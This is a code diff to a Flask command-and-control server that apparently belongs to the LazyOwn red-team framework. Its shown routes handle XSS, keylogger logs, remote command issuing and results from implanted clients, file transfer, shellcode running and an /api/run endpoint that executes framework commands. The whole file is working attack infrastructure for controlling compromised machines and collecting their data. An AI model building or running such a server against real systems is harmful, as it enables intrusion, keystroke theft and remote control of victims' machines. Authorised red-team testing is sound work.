@@ -2,17 +2,21 @@ import re
 import os
 import sys
 import json
+import yaml
 import socket
 import logging
 import threading
 from functools import wraps
+from lazyown import LazyOwnShell
 from dnslib.dns import RR, QTYPE, TXT
 from dnslib.server import DNSServer, DNSLogger
 from flask import Flask, request, render_template, redirect, url_for, jsonify, Response, send_from_directory
 
 
 BASE_DIR = os.path.abspath("../sessions")  
-
+shell = LazyOwnShell()
+shell.onecmd('p')
+shell.onecmd('create_session_json')
 if len(sys.argv) > 3:
     lport = sys.argv[1]
     USERNAME = sys.argv[2]
@@ -22,10 +26,12 @@ else:
     print("    [!] Need pass the port, user & pass as argument")
     sys.exit(2)
 
-app = Flask(__name__)
+app = Flask(__name__, static_folder='static')
 commands = {} 
-results = {}  
+results = {}
+commands_history = {} 
 connected_clients = set() 
+atomic_framework_path = '/home/grisun0/LazyOwn/external/.exploit/atomic-red-team/atomics'
 
 def check_auth(username, password):
     """Verifica si el usuario y contraseña son correctos"""
@@ -71,8 +77,21 @@ def start_dns_server():
 @app.route('/')
 @requires_auth
 def index():
-    return render_template('index.html', connected_clients=connected_clients, results=results)
+    path = os.getcwd()
+    sessions_dir = f'{path}/sessions'
+    json_files = [f for f in os.listdir(sessions_dir) if f.endswith('.json')]
+    if not json_files:
+        return "No JSON files found in the sessions directory.", 404
 
+    latest_json_file = max(json_files, key=lambda x: os.path.getctime(os.path.join(sessions_dir, x)))
+    json_path = os.path.join(sessions_dir, latest_json_file)
+
+    with open(json_path, 'r') as f:
+        session_data = json.load(f)
+
+    connected_clients_list = list(connected_clients)
+    directories = [d for d in os.listdir(atomic_framework_path) if os.path.isdir(os.path.join(atomic_framework_path, d))]
+    return render_template('index.html', connected_clients=connected_clients_list, results=results, session_data=session_data, commands_history=commands_history, username=USERNAME, password=PASSWORD, directories=directories)
 
 @app.route('/xss', methods=['GET'])
 def xss():
@@ -105,9 +124,20 @@ def receive_result(client_id):
         data = request.json
         if data and 'output' in data:
             output = data['output']
-            results[client_id] = output
-            print(f"[INFO] Received output from {client_id}: {output}")
-            return jsonify({"status": "success"}), 200
+            client = data['client']
+            command = data.get('command')
+
+            results[client_id] = {
+                "output": output,
+                "client": client
+            }
+            if command:
+                results[client_id]["command"] = command
+            if output != "":
+                print(f"[INFO] Received output from {client_id}: {output} Plataform: {client}")
+                return jsonify({"status": "success", "Plataform": client}), 200
+            else:
+                return jsonify({"status": "empty", "Plataform": client}), 200
         else:
             print(f"[ERROR] Invalid data received from {client_id}")
             return jsonify({"status": "error", "message": "Invalid data format"}), 400
@@ -122,8 +152,12 @@ def receive_result(client_id):
 def issue_command():
     client_id = request.form['client_id']
     command = request.form['command']
-    print(command)
+
     commands[client_id] = command
+    if client_id not in commands_history:
+        commands_history[client_id] = []
+    commands_history[client_id].append(command)
+
     return redirect(url_for('index'))
 
 @app.route('/upload', methods=['GET', 'POST'])
@@ -147,8 +181,9 @@ def upload():
         if file.filename == '':
             return jsonify({"status": "error", "message": "No selected file"}), 400
         safe_filename = secure_filename(file.filename)
-        path = os.getcwd().replace("modules", "sessions")
-        uploads_dir = os.path.join(path, 'uploads')
+        path = os.getcwd()
+
+        uploads_dir = os.path.join(path+"/sessions", 'uploads')
         os.makedirs(uploads_dir, exist_ok=True)
         filepath = os.path.join(uploads_dir, safe_filename)
         file.save(filepath)  
@@ -192,12 +227,39 @@ def keylogger(client_id):
         print(f"[ERROR] Error procesando logs de {client_id}: {str(e)}")
         return jsonify({"status": "error", "message": "Internal server error"}), 500
 
+@app.route('/view_yaml', methods=['POST'])
+@requires_auth
+def view_yaml():
+    selected_directory = request.form.get('directory')
+    if not selected_directory:
+        return redirect(url_for('index'))
+
+    yaml_data = []
+
+    selected_path = os.path.join(atomic_framework_path, selected_directory)
+
+    for root, dirs, files in os.walk(selected_path):
+        for file in files:
+            if file.endswith('.yaml'):
+                yaml_file_path = os.path.join(root, file)
+                with open(yaml_file_path, 'r') as file:
+                    data = yaml.safe_load(file)
+                    for test in data.get('atomic_tests', []):
+                        yaml_data.append({
+                            'auto_generated_guid': test.get('auto_generated_guid'),
+                            'name': test.get('name'),
+                            'description': test.get('description'),
+                            'supported_platforms': test.get('supported_platforms')
+                        })
+
+    return render_template('yaml_view.html', yaml_data=yaml_data, directory=selected_directory)
+
 @app.route('/download_file', methods=['POST'])
 def download_file():
     client_id = request.form['client_id']
     file = request.files['file']
     if file:
-        temp_dir = os.path.join(os.getcwd(), 'temp_uploads')
+        temp_dir = os.path.join(os.getcwd(), 'sessions/temp_uploads')
         os.makedirs(temp_dir, exist_ok=True)
         file_path = os.path.join(temp_dir, file.filename)
         file.save(file_path)
@@ -209,7 +271,7 @@ def download_file():
 
 @app.route('/download/<path:file_path>', methods=['GET'])
 def serve_file(file_path):
-    temp_dir = os.path.join(os.getcwd(), 'temp_uploads')
+    temp_dir = os.path.join(os.getcwd(), 'sessions/temp_uploads')
     full_file_path = os.path.join(temp_dir, file_path)
     if os.path.exists(full_file_path):
         try:
@@ -220,6 +282,62 @@ def serve_file(file_path):
     else:
         return jsonify({"status": "error", "message": "File not found"}), 404
 
+@app.route('/api/run', methods=['POST'])
+@requires_auth
+def run_command():
+    data = request.json
+    command = data.get('command')
+
+    if not command:
+        return jsonify({"error": "No command provided"}), 400
+
+    output = shell.onecmd(command)
+    print(f"[INFO]{output}")
+
+    
+    print(f"[INFO] Type of output: {type(output)}")
+
+    
+    if isinstance(output, str):
+        serializable_output = output
+    elif isinstance(output, (int, float, bool, type(None))):
+        serializable_output = str(output)
+    elif isinstance(output, (list, dict)):
+        serializable_output = output
+    else:
+        
+        try:
+            serializable_output = vars(output)
+        except TypeError:
+            serializable_output = str(output)
+
+    return jsonify({"result": serializable_output}), 200
+ 
+
+
+@app.route('/api/output', methods=['GET'])
+def get_output():
+    global shell
+    output = shell.output  
+
+    
+    print(f"[INFO] Type of output: {type(output)}")
+
+    
+    if isinstance(output, str):
+        serializable_output = output
+    elif isinstance(output, (int, float, bool, type(None))):
+        serializable_output = str(output)
+    elif isinstance(output, (list, dict)):
+        serializable_output = output
+    else:
+        
+        try:
+            serializable_output = vars(output)
+        except TypeError:
+            serializable_output = str(output)
+
+    return jsonify({"output": serializable_output}) 
 
 @app.route('/run_shellcode', methods=['POST'])
 @requires_auth
